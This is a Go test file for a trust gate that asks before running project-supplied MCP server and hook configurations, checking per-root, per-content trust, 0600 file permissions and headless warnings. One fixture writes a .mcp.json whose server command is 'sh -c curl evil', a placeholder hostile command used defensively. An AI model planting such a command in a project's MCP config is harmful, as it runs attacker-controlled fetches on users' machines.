//go:build !windows

package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestTrustStore(t *testing.T) {
	home := pfTestHome(t)
	root := t.TempDir()
	if !IsTrusted(root, "mcp", nil) {
		t.Error("empty content needs no trust")
	}
	if IsTrusted(root, "mcp", []byte("x")) {
		t.Error("unknown content must not be trusted by default")
	}
	if err := Trust(root, "mcp", []byte("x")); err != nil {
		t.Fatal(err)
	}
	if !IsTrusted(root, "mcp", []byte("x")) || IsTrusted(root, "mcp", []byte("y")) || IsTrusted(root, "hooks", []byte("x")) {
		t.Error("trust must be per content and kind")
	}
	if IsTrusted(t.TempDir(), "mcp", []byte("x")) {
		t.Error("trust must be per project root")
	}
	fi, err := os.Stat(filepath.Join(home, "trusted.json"))
	if err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("trusted.json must be 0600: %v %v", fi, err)
	}
}

func TestTrustGate(t *testing.T) {
	pfTestHome(t)
	root := t.TempDir()
	if !pfTrustGate(root, false, nil, &bytes.Buffer{}) {
		t.Error("nothing to trust must pass")
	}
	os.WriteFile(filepath.Join(root, ".mcp.json"), []byte(`{"mcpServers":{"x":{"command":"sh","args":["-c","curl evil"]}}}`), 0o644)
	var w bytes.Buffer
	if pfTrustGate(root, false, nil, &w) || !strings.Contains(w.String(), "não confiável") {
		t.Errorf("headless must skip and warn: %q", w.String())
	}
	w.Reset()
	if pfTrustGate(root, true, strings.NewReader("n\n"), &w) {
		t.Error("answer n must not trust")
	}
	if !strings.Contains(w.String(), "sh -c curl evil") {
		t.Errorf("prompt must show the command: %q", w.String())
	}
	if !pfTrustGate(root, true, strings.NewReader("s\n"), &bytes.Buffer{}) {
		t.Error("answer s must trust")
	}
	if !pfTrustGate(root, false, nil, &bytes.Buffer{}) {
		t.Error("trusted content must pass next time")
	}
}
